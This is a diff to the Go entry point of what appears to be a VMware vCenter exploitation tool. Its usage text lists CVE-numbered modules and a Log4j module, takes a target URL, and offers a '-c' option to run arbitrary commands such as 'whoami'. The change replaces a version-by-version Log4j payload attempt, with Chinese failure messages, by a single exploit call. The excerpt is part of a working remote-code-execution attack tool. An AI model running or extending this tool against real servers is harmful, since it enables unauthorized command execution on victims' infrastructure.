@@ -29,7 +29,7 @@ func usage() {
 	-u url
 		  you target, example: https://192.168.1.1
 	-m module
-		  you selected cve code, example: 21972 or 22205 or 21985 or log4center
+		  you selected cve code, example: 21972 or 22005 or 21985 or log4center
 	-c command
 		  you want execute command, example: "whoami"
 	-f filename
@@ -117,14 +117,7 @@ func main() {
 					usage()
 					os.Exit(0)
 				} else {
-					if log4jcenter.Exec_cmd(url, rmi, command, "6") {
-						//
-					} else {
-						fmt.Println("[-] Vcenter 6.X paylaod 利用失败，尝试7.0")
-						if !log4jcenter.Exec_cmd(url, rmi, command, "7") {
-							fmt.Println("[-] 回显失败，目标不存在漏洞或其他原因.")
-						}
-					}
+					log4jcenter.Execc(url, rmi, command)
 				}
 
 			} else {
